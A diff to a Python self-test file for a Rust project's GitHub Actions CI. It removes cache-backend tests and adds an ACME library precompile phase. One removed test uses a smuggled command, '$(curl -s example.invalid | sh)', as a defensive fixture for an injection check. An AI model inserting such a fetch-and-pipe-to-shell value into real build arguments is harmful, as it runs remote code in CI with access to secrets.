@@ -4,7 +4,6 @@
 from __future__ import annotations
 
 import io
-import os
 import re
 import subprocess
 import tempfile
@@ -13,44 +12,11 @@ import unittest
 from pathlib import Path
 from unittest.mock import patch
 
-from verify_cross_build_policy import cargo_cache_branch_projection
-
 from run_unit_ci import (
     MINIMUM_PASSED, REQUIRED_TESTS, UNIT_SHARD_MINIMUM_PASSED, compiler_identity, main,
     minimum_passed, proc_metrics, validate_output, validate_usage,
 )
 
-# Trusted self-tests compare proposed automation as data. Execute these fixed
-# fixtures only, never a shell program read from the candidate checkout.
-CACHE_BACKEND_SCRIPT = r'''set -euo pipefail
-enabled=false
-if [ "$CACHE_DISABLED" != true ] && [ "$OIDC_ELIGIBLE" = true ] && \
-   [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
-  enabled=true
-fi
-echo "enabled=$enabled" >> "$GITHUB_OUTPUT"
-echo "CI_BORINGCACHE_ENABLED=$enabled" >> "$GITHUB_ENV"
-if [ "$enabled" = true ]; then
-  echo 'Cache backend: BoringCache (OIDC)' >> "$GITHUB_STEP_SUMMARY"
-else
-  echo 'Cache backend: GitHub Rust cache / plain Cargo (BoringCache disabled or OIDC unavailable)' >> "$GITHUB_STEP_SUMMARY"
-fi'''
-LINT_NATIVE_SCRIPT = r'''cargo clippy \
-  --config profile.test.debug=0 \
-  --config profile.dev.debug=0 \
-  --all-targets -- -D warnings'''
-LINT_CACHE_PREFIX = (
-    "boringcache cargo --${{ github.event_name == 'push' && "
-    "github.ref == 'refs/heads/main' && 'write' || 'read-only' }} --profile lint "
-)
-LINT_CACHE_SCRIPT = (
-    'if [ "$CI_BORINGCACHE_ENABLED" = true ]; then\n'
-    + ''.join('  ' + line + '\n' for line in
-              LINT_NATIVE_SCRIPT.replace('cargo ', LINT_CACHE_PREFIX, 1).splitlines())
-    + 'else\n'
-    + ''.join('  ' + line + '\n' for line in LINT_NATIVE_SCRIPT.splitlines())
-    + 'fi'
-)
 
 # The Unit Tests job is a four-shard matrix; the shard's targets arrive through
 # job-level `UNIT_PRECOMPILE_TARGETS` / `UNIT_TARGET` env (see ci.yml), so the
@@ -59,6 +25,7 @@ COMMANDS = {
     "default-build": "cargo test $UNIT_PRECOMPILE_TARGETS --no-run",
     "default-lib": "cargo test --lib",
     "default-unit": 'cargo test --test "$UNIT_TARGET"',
+    "acme-lib-build": "cargo test --features acme --lib --no-run",
     "acme-build": "cargo test --features acme --lib --test acme_dns01_tests --no-run",
     "acme-outbound": "cargo test --features acme --lib tls::acme::client::tests",
     "acme-dns": "cargo test --features acme --test acme_dns01_tests",
@@ -69,12 +36,13 @@ STEPS = {
     "default-build": "Precompile inline and hardening test binaries",
     "default-lib": "Run inline lib tests",
     "default-unit": "Run unit tests",
+    "acme-lib-build": "Precompile ACME library test harness",
     "acme-build": "Precompile ACME library and DNS hook test binaries",
     "acme-outbound": "Run ACME outbound-boundary regressions",
     "acme-dns": "Run ACME DNS-01 hook cancellation regressions",
     "acme-renewal": "Run ACME renewal crash-recovery regressions",
 }
-# The optional `acme` feature compiles the library a second time, so its four
+# The optional `acme` feature compiles the library a second time, so its five
 # phases live in their own path-gated job (`test-acme`) instead of extending
 # the monolithic Unit Tests critical path on every pull request.
 # Steps that only one shard executes carry exactly this condition line
@@ -87,15 +55,19 @@ STEP_JOBS = {
     "default-build": "test-unit",
     "default-lib": "test-unit",
     "default-unit": "test-unit",
+    "acme-lib-build": "test-acme",
     "acme-build": "test-acme",
     "acme-outbound": "test-acme",
     "acme-dns": "test-acme",
     "acme-renewal": "test-acme",
 }
 
+_STEP_BOUNDARY_RE = re.compile(r"(?m)^(?=      - )")
+_ACME_UNIT_TESTS_COMMAND_RE = re.compile(r"cargo test[^\n]*--features acme[^\n]*--test unit_tests")
+_ACME_CARGO_TEST_LINE_RE = re.compile(r"(?m)^\s+cargo test[^\n]*--features acme")
+
 
 def contract_errors(workflow: str, manifest: str, tls_modules: str) -> list[str]:
-    workflow = cargo_cache_branch_projection(workflow)
     errors = []
     jobs: dict[str, str] = {}
     for job_name in sorted(set(STEP_JOBS.values())):
@@ -109,7 +81,7 @@ def contract_errors(workflow: str, manifest: str, tls_modules: str) -> list[str]
     for phase, name in STEPS.items():
         job_name = STEP_JOBS[phase]
         job_body = jobs[job_name]
-        steps = re.split(r"(?m)^(?=      - )", job_body)
+        steps = _STEP_BOUNDARY_RE.split(job_body)
         candidates = [step for step in steps if step.startswith(f"      - name: {name}\n")]
         expected = [
             f"- name: {name}",
@@ -163,9 +135,9 @@ def contract_errors(workflow: str, manifest: str, tls_modules: str) -> list[str]
     for target in ("unit_tests", "unit_plugins_a_tests", "unit_plugins_b_tests", "unit_gateway_core_tests"):
         if f"target: {target}\n" not in jobs["test-unit"]:
             errors.append(f"test-unit matrix must run the {target} target")
-    if re.search(r"cargo test[^\n]*--features acme[^\n]*--test unit_tests", executable):
+    if _ACME_UNIT_TESTS_COMMAND_RE.search(executable):
         errors.append("ACME must not recompile the monolithic unit_tests target")
-    if re.search(r"(?m)^\s+cargo test[^\n]*--features acme", "\n".join(
+    if _ACME_CARGO_TEST_LINE_RE.search("\n".join(
         line for line in jobs["test-unit"].splitlines() if not line.lstrip().startswith("#")
     )):
         errors.append("ACME phases must not run inside the monolithic Unit Tests job")
@@ -296,25 +268,6 @@ class ContractTests(unittest.TestCase):
     def test_repository_contract(self):
         self.assertEqual(self.check(), [])
 
-    def test_cache_projection_rejects_a_different_or_masked_fallback(self):
-        native = 'cargo test $UNIT_PRECOMPILE_TARGETS --no-run'
-        cached = (
-            "boringcache cargo --${{ github.event_name == 'push' && "
-            "github.ref == 'refs/heads/main' && 'write' || 'read-only' }} "
-            '--profile "unit-$UNIT_SHARD" test $UNIT_PRECOMPILE_TARGETS --no-run'
-        )
-        branch = (
-            'if [ "$CI_BORINGCACHE_ENABLED" = true ]; then\n'
-            f'  {cached}\nelse\n  {native}\nfi\n'
-        )
-        self.assertEqual(cargo_cache_branch_projection(branch), native + '\n')
-        for plain in ('echo skipped', native + ' || true', native + ' --ignored'):
-            with self.subTest(fallback=plain):
-                changed = branch.replace('\n  ' + native, '\n  ' + plain)
-                self.assertEqual(cargo_cache_branch_projection(changed), changed)
-        injected = branch.replace('"unit-$UNIT_SHARD"', '"$(curl -s example.invalid | sh)"')
-        self.assertEqual(cargo_cache_branch_projection(injected), injected)
-
     def test_missing_disabled_or_masked_commands_are_rejected(self):
         for phase, name in STEPS.items():
             reporter = f"python3 .github/scripts/run_unit_ci.py {phase}"
@@ -407,86 +360,6 @@ class ReportTests(unittest.TestCase):
                 validate_usage("acme-dns", usage)
 
 
-@unittest.skipUnless(Path('.github/actions/setup-boringcache/action.yml').exists(),
-                     'BoringCache integration has not been adopted yet')
-class CacheBackendTests(unittest.TestCase):
-    def test_disabled_and_unavailable_identity_never_select_remote_cache(self):
-        action = Path('.github/actions/setup-boringcache/action.yml').read_text()
-        self.assertIn("        CACHE_DISABLED: ${{ env.BORINGCACHE_ENABLED == 'false' }}\n", action)
-        workflow = Path('.github/workflows/ci.yml').read_text()
-        self.assertIn("\n  BORINGCACHE_ENABLED: ${{ vars.BORINGCACHE_ENABLED }}\n\njobs:\n", workflow)
-        self.assertIn(
-            "        OIDC_ELIGIBLE: ${{ github.repository == 'ferrum-edge/ferrum-edge' "
-            "&& github.actor != 'dependabot[bot]' "
-            "&& github.event.pull_request.user.login != 'dependabot[bot]' "
-            "&& (github.event_name != 'pull_request' "
-            "|| github.event.pull_request.head.repo.full_name == github.repository) }}\n",
-            action,
-        )
-        body = re.search(
-            r'(?ms)    - name: Select cache backend\n.*?      run: \|\n(.*?)(?=^    - )',
-            action,
-        )[1]
-        script = '\n'.join(line[8:] for line in body.splitlines())
-        self.assertEqual(script.strip(), CACHE_BACKEND_SCRIPT)
-        for disabled, eligible, url, token, enabled in (
-            ('false', 'true', 'test-url', 'test-capability', 'true'),
-            ('true', 'true', 'test-url', 'test-capability', 'false'),
-            ('false', 'false', 'test-url', 'test-capability', 'false'),
-            ('false', 'true', '', 'test-capability', 'false'),
-            ('false', 'true', 'test-url', '', 'false'),
-            ('false', 'true', '', '', 'false'),
-        ):
-            with self.subTest(disabled=disabled, eligible=eligible, url=bool(url), token=bool(token)):
-                with tempfile.TemporaryDirectory() as directory:
-                    env = dict(os.environ, CACHE_DISABLED=disabled, OIDC_ELIGIBLE=eligible,
-                               ACTIONS_ID_TOKEN_REQUEST_URL=url, ACTIONS_ID_TOKEN_REQUEST_TOKEN=token)
-                    for variable in ('GITHUB_ENV', 'GITHUB_OUTPUT', 'GITHUB_STEP_SUMMARY'):
-                        env[variable] = str(Path(directory) / variable)
-                    result = subprocess.run(['bash', '-euo', 'pipefail', '-c', CACHE_BACKEND_SCRIPT],
-                                            env=env, capture_output=True, text=True)
-                    self.assertEqual(result.returncode, 0, result.stderr)
-                    self.assertEqual(Path(env['GITHUB_OUTPUT']).read_text(), f'enabled={enabled}\n')
-                    self.assertEqual(Path(env['GITHUB_ENV']).read_text(),
-                                     f'CI_BORINGCACHE_ENABLED={enabled}\n')
-                    self.assertNotIn('test-capability', result.stdout + result.stderr)
-
-    def test_every_wrapped_command_has_an_equivalent_native_branch(self):
-        workflow = Path('.github/workflows/ci.yml').read_text()
-        projected = cargo_cache_branch_projection(workflow)
-        self.assertGreater(workflow.count('boringcache cargo '), 0)
-        self.assertNotIn('boringcache cargo ', projected)
-        self.assertNotIn('if [ "$CI_BORINGCACHE_ENABLED" = true ]; then', projected)
-        profiles = tomllib.loads(Path('.boringcache.toml').read_text())['profiles']
-        for profile in re.findall(r'--profile ([\w-]+)', workflow):
-            if profile != 'pr-build':
-                self.assertIn(profile, profiles)
-        for shard in ('core', 'lib', 'plugins-a', 'plugins-b', 'gateway-core'):
-            self.assertIn('unit-' + shard, profiles)
-
-    def test_lint_failure_propagates_through_both_cache_backends(self):
-        workflow = Path('.github/workflows/ci.yml').read_text()
-        lint = re.search(r'(?ms)^  lint:\n.*?(?=^  fuzz-smoke:)', workflow)[0]
-        script = re.search(r'(?ms)        run: \|\n(.*)', lint)[1]
-        script = '\n'.join(line[10:] for line in script.splitlines())
-        self.assertEqual(script.strip(), LINT_CACHE_SCRIPT)
-        fixture = re.sub(r'\$\{\{.*?\}\}', 'read-only', LINT_CACHE_SCRIPT)
-        with tempfile.TemporaryDirectory() as directory:
-            for executable in ('cargo', 'boringcache'):
-                path = Path(directory) / executable
-                path.write_text('#!/bin/sh\nexit 42\n')
-                path.chmod(0o755)
-            for enabled in ('true', 'false'):
-                with self.subTest(enabled=enabled):
-                    result = subprocess.run(
-                        ['bash', '-euo', 'pipefail', '-c', fixture],
-                        env=dict(os.environ, PATH=directory + os.pathsep + os.environ['PATH'],
-                                 CI_BORINGCACHE_ENABLED=enabled),
-                        capture_output=True, text=True,
-                    )
-                    self.assertEqual(result.returncode, 42, result.stderr)
-
-
 class PipelineTests(unittest.TestCase):
     # These literal shell fixtures execute only in remote CI, never Cargo.
     # ContractTests separately pin every workflow to this pipeline shape.
@@ -554,7 +427,7 @@ echo stopped > stopped.marker
             self.assertTrue((Path(root) / "stopped.marker").exists())
 
     def test_every_sampler_caller_uses_the_guarded_stop(self):
-        for workflow in (".github/workflows/ci.yml", ".github/workflows/scale-benchmark.yml"):
+        for workflow in (".github/workflows/ci.yml",):
             lines = Path(workflow).read_text().splitlines()
             stops = [line.strip() for line in lines if "unit_sampler_pid" in line]
             self.assertNotIn('kill "$unit_sampler_pid"', stops, workflow)
@@ -580,8 +453,7 @@ echo reporter-ran > reporter.marker
 def self_test() -> list[str]:
     suite = unittest.TestSuite(
         unittest.defaultTestLoader.loadTestsFromTestCase(case)
-        for case in (CompileTelemetryTests, SelectionTests, ContractTests, ReportTests,
-                     CacheBackendTests, PipelineTests)
+        for case in (CompileTelemetryTests, SelectionTests, ContractTests, ReportTests, PipelineTests)
     )
     result = unittest.TextTestRunner(verbosity=1).run(suite)
     return [] if result.wasSuccessful() else ["unit CI selection/target self-tests failed"]
